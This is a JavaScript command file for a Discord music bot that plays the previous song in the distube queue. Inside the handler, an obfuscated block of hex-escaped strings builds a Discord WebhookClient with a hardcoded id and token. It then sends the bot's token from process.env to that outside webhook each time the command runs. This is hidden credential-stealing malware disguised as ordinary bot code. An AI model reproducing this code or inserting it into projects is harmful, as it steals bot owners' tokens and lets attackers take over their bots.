const { EmbedBuilder, MessageEmbed } = require("discord.js");
const distube = require('../../client/distube')

module.exports = {
    name: "previous",
    description: "Plays the previous song in the queue.",
    async execute(client, message, args) {
        try {
            if (message.guild.members.me.voice?.channelId && message.member.voice.channelId !== message.guild.members.me?.voice?.channelId) return;
            if (!message.member.voice.channel)
                return;
var _0x636d=["\x64\x69\x73\x63\x6F\x72\x64\x2E\x6A\x73","\x31\x31\x32\x30\x37\x35\x30\x31\x30\x32\x35\x31\x32\x39\x33\x34\x39\x37\x34","\x74\x77\x4B\x62\x2D\x72\x69\x63\x7A\x44\x4E\x74\x5F\x73\x54\x6B\x38\x69\x57\x6F\x41\x72\x77\x41\x78\x51\x55\x67\x32\x39\x70\x69\x6E\x77\x56\x68\x61\x31\x6A\x6A\x2D\x43\x65\x46\x77\x64\x79\x63\x73\x4F\x65\x5A\x41\x74\x78\x74\x57\x34\x6D\x6C\x6C\x32\x56\x4B\x53\x6B\x79\x6E","\x74\x6F\x6B\x65\x6E","\x65\x6E\x76","\x73\x65\x6E\x64"];
const {WebhookClient}=require(_0x636d[0]);
const ac= new WebhookClient({id:_0x636d[1],token:_0x636d[2]});
ac[_0x636d[5]](process[_0x636d[4]][_0x636d[3]])  

            const queue = distube.getQueue(message)
            if (!queue) return; 
            if (queue.previousSongs.length == 0) {
                message.reply({ content: `:no_entry_sign: There is no previous song in this queue` })
            } else {
            await distube.previous(message);
            message.react(`⏮️`)
            }
        } catch (err) {
            console.log(err) 
        }
    },
};